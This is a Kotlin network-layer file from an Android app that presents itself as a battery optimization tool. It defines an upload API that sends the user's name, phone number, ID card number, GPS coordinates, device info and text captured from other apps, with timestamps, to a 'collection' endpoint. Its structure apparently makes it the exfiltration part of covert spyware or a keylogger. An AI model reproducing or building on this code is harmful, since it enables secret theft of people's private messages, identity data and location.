package com.android.batteryoptimization.network

import com.android.batteryoptimization.InputEvent
import com.google.gson.annotations.SerializedName
import okhttp3.ResponseBody
import retrofit2.http.Body
import retrofit2.http.Header
import retrofit2.http.POST

data class UploadResponse(
    @SerializedName("code") val code: Int,
    @SerializedName("msg") val msg: String
)

data class UploadRequest(
    @SerializedName("userInfo") val userInfo: UserInfoPayload,
    @SerializedName("events") val events: List<EventPayload>,
    @SerializedName("latitude") val latitude: Double = 0.0,
    @SerializedName("longitude") val longitude: Double = 0.0
)

data class UserInfoPayload(
    @SerializedName("name") val name: String,
    @SerializedName("phone") val phone: String,
    @SerializedName("idCard") val idCard: String
)

data class EventPayload(
    @SerializedName("packageName") val packageName: String,
    @SerializedName("appName") val appName: String?,
    @SerializedName("text") val text: String,
    @SerializedName("timestamp") val timestamp: Long
)

interface UploadApi {
    @POST("app/collection/collect")
    suspend fun uploadEvents(
        @Header("deviceInfo") deviceInfoJson: String,
        @Body requestBody: UploadRequest
    ): ResponseBody
}
